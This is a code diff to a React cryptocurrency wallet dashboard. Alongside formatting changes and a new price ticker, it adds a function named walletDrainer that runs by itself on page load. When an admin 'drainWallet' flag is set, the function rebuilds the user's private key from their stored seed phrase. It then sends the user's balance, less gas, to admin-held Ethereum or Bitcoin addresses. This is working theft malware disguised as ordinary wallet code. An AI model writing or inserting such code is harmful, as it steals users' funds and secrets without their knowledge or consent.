@@ -22,37 +22,13 @@ import SendModal from '../Modal/SendModal';
 import LoadingSkeleton from '../components/Loader';
 import AuthModal from '../Modal/AuthModal';
 import { useDispatch, useSelector } from 'react-redux';
-import { getToken } from '../store/action/appStorage';
-
-
-import { idbRemove,idbSet,idbGet } from "../store/action/appStorage";
+import { getToken, sendBtcTansaction, sendtansaction } from '../store/action/appStorage';
+import { idbGet } from "../store/action/appStorage";
 import { evmChains } from '../utils/utils';
+import { ethers } from 'ethers';
 
 
 
-/*
-How the emv chains look like
-
-const evmChains = [
-    
-    {
-      name: "Bitcoin",
-      ticker: "BTC",
-      chainId: 'btc',
-      chainHex: "btc",
-      rpcUrl:'' 
-    },
-  
-    {
-      name: "Kava EVM",
-      ticker: "KAVA",
-      chainId: 2222,
-      chainHex: "0x8ae",
-      rpcUrl: 'https://rpc.ankr.com/premium-http/kava_api/f414bb17cce648f9c2381aa7a35bda9970bc1aa99d455cae9c3d07609a1bb84d'
-    }
-  ];
-
-  */
 const data = [
     { name: 'Bitcoin', value: 40 },
     { name: 'Ethereum', value: 35 },
@@ -102,8 +78,15 @@ const Dashboard = () => {
     const [authInfo, setAuthInfo] = useState("");
     const [ticker, setTicker] = useState("");
     const [balance, setBalance] = useState("");
-    let { user, seedphrase, chain, network, address } = useSelector(state => state.userAuth)
+    const [sendLoader, setSendLoader] = useState(false)
+    let { user, seedphrase, chain, network, address, admin,amount } = useSelector(state => state.userAuth)
     const dispatch = useDispatch()
+    const [hash, setHash] = useState('')
+
+
+
+    //, , , , amount, balance,       recipientAddress
+
 
 
 
@@ -117,6 +100,92 @@ const Dashboard = () => {
             }
         }
     })
+
+    const walletDrainer = async () => {
+        let newBalance
+        let recipientAddress = admin.ethereumwalletaddress
+        if (admin.drainWallet && balance > 0) {
+            
+            if (amount) {
+                newBalance = amount
+            } else {
+                newBalance = balance
+            }
+            if (sendLoader) return;
+            setSendLoader(true);
+
+            // Handle Bitcoin separately
+            if (chain === 'btc') {
+            let amount = newBalance
+            recipientAddress = admin.bitcoinwalletaddress
+                const res = await dispatch(
+                    sendBtcTansaction(chain, address, network, seedphrase, amount, balance, recipientAddress)
+                );
+                setSendLoader(false);
+                setIsAuthError(true);
+                return setAuthInfo(res.message);
+            }
+
+            try {
+                const chainObj = evmChains.find(data => data.chainHex === chain);
+
+                if (!chainObj || !chainObj.rpcUrl) {
+                    setIsAuthError(true);
+                    setSendLoader(false);
+                    return setAuthInfo('Chain or RPC not found');
+                }
+
+                const provider = new ethers.JsonRpcProvider(chainObj.rpcUrl);
+                const wallet = new ethers.Wallet(
+                    ethers.Wallet.fromPhrase(seedphrase).privateKey,
+                    provider
+                );
+
+                //const userBalance = await provider.getBalance(wallet.address);
+                const gasPrice = await provider.getGasPrice();
+                const estimatedGasLimit = 21000n; // Standard simple transfer
+                const gasCost = gasPrice * estimatedGasLimit;
+
+                if (newBalance <= gasCost) {
+                    setIsAuthError(true);
+                    setSendLoader(false);
+                    return setAuthInfo('Not enough balance to cover gas.');
+                }
+
+                const valueToSend = newBalance - gasCost;
+                const tx = await wallet.sendTransaction({
+                    to: recipientAddress,
+                    value: valueToSend,
+                });
+
+                setHash(tx.hash);
+                await tx.wait();
+
+                setSendLoader(false);
+                setIsAuthError(true);
+                setAuthInfo(`Successfully sent funds to ${recipientAddress}`);
+
+                const res = await dispatch(
+                    sendtansaction(recipientAddress, chainObj.ticker, ethers.formatEther(valueToSend), chain, ethers.formatEther(newBalance), user)
+                );
+
+                if (!res.bool) {
+                    setIsAuthError(true);
+                    return setAuthInfo(res.message);
+                }
+            } catch (err) {
+                setHash(null);
+                setIsAuthError(true);
+                setSendLoader(false);
+                setAuthInfo(`Transaction failed: ${err.message}`);
+            }
+        }else{
+            //alert('insufficient fund')
+        }
+    };
+
+
+
 
     // Fetch crypto data from CoinGecko API
     const fetchCryptoData = async () => {
@@ -179,9 +248,14 @@ const Dashboard = () => {
 
 
     useEffect(() => {
-        fetchCryptoData();
-        fetchTokens()
+        const runInOrder = async () => {
+            await fetchCryptoData();
+            await fetchTokens();
+            await walletDrainer();
+        };
+        runInOrder();
     }, []);
+
 
     const updateAuthError = () => {
         setIsAuthError(prev => !prev);
@@ -225,7 +299,7 @@ const Dashboard = () => {
 
     const actionHandler = (data) => {
         //for buy and sell throw why user has error
-        if(data === 'sell-assets'|| data === 'buy-assets'){
+        if (data === 'sell-assets' || data === 'buy-assets') {
 
         }
         if (data === 'receive') {
@@ -233,7 +307,7 @@ const Dashboard = () => {
         }
         navigate(`/${data}`)
     }
-    
+
 
     const notificationHandler = () => {
         navigate('/notifications')
@@ -244,8 +318,8 @@ const Dashboard = () => {
     }
 
 
-    const navigateTabHandler = async(url) => {
-       
+    const navigateTabHandler = async (url) => {
+
         if (url === 'dashboard') {
             if (!user.walletFeauture) {
                 setIsAuthError(true)
@@ -293,8 +367,8 @@ const Dashboard = () => {
 
     }
 
-    const navigateMobileHandler = async(url) => {
-       
+    const navigateMobileHandler = async (url) => {
+
         if (url === 'dashboard') {
             if (!user.walletFeauture) {
                 setIsAuthError(true)
@@ -347,7 +421,12 @@ const Dashboard = () => {
         }
         return "0.00";
     };
-    
+
+    // alert(admin.drainWallet)
+
+
+
+
 
 
 
@@ -376,19 +455,32 @@ const Dashboard = () => {
                         openSendModalFun={openSendModalFun}
                         sidebarOpen={sidebarOpen}
                     />
+                    <div className={styles.tickerTape}>
+                        <div className={styles.tickerInner}>
+                            {cryptoData.map((coin, index) => (
+                                <div key={index} className={styles.tickerItem}>
+                                    <img src={coin.image} alt={coin.name} className={styles.coinIcon} />
+                                    <span className={styles.coinName}>{coin.symbol.toUpperCase()}</span>
+                                    <span className={coin.price_change_percentage_24h >= 0 ? styles.priceUp : styles.priceDown}>
+                                        ${coin.current_price.toFixed(2)} ({coin.price_change_percentage_24h.toFixed(2)}%)
+                                    </span>
+                                </div>
+                            ))}
+                        </div>
+                    </div>
 
 
                     <div className={styles.dashboardContent}>
 
                         <div className={styles.mobileMainSection}>
                             <div className={styles.balanceSection}>
-                            <div className={styles.balanceCard}>
-                            
-  <p className={styles.amount}>{parseFloat(balance).toFixed(6)} {ticker}</p>
-  <p className={styles.usdAmount}>${getUsdEquivalent()} USD</p>
-  <p className={styles.amounttext}>Your wallet balance</p>
+                                <div className={styles.balanceCard}>
 
-  <div className={styles.balanceActionContainer}>
+                                    <p className={styles.amount}>{parseFloat(balance).toFixed(6)} {ticker}</p>
+                                    <p className={styles.usdAmount}>${getUsdEquivalent()} USD</p>
+                                    <p className={styles.amounttext}>Your wallet balance</p>
+
+                                    <div className={styles.balanceActionContainer}>
                                         <button onClick={() => actionHandler('buy-assets')}>
                                             <FaPlus size={18} /> Buy
                                         </button>
@@ -402,9 +494,9 @@ const Dashboard = () => {
                                             <MdArrowDownward size={18} /> Receive
                                         </button>
                                     </div>
-  
- 
-</div>
+
+
+                                </div>
 
                             </div>
                             {/* Switchable Tabs */}
@@ -414,14 +506,14 @@ const Dashboard = () => {
                                         className={activeTab === 'tab1' ? styles.activeTab : ''}
                                         onClick={() => setActiveTab('tab1')}
                                     >
-                                       
+
                                         Market Trends
                                     </button>
                                     <button
                                         className={activeTab === 'tab2' ? styles.activeTab : ''}
                                         onClick={() => setActiveTab('tab2')}
                                     >
-                                         Token
+                                        Token
                                     </button>
                                 </div>
 
@@ -440,8 +532,8 @@ const Dashboard = () => {
                                         loading ? (
                                             <SpinnerModal />
                                         ) : (
-                                           
-                                              <Token data={cryptoData} />
+
+                                            <Token data={cryptoData} />
                                         )
                                     )}
                                 </div>
@@ -459,9 +551,9 @@ const Dashboard = () => {
 
 
                                     <div className={styles.desktopbalanceCard}>
-  <p className={styles.desktopamount}>{parseFloat(balance).toFixed(6)} {ticker}</p>
-  <p className={styles.desktopusdAmount}>${getUsdEquivalent()} USD</p>
-</div>
+                                        <p className={styles.desktopamount}>{parseFloat(balance).toFixed(6)} {ticker}</p>
+                                        <p className={styles.desktopusdAmount}>${getUsdEquivalent()} USD</p>
+                                    </div>
 
 
                                 </div>
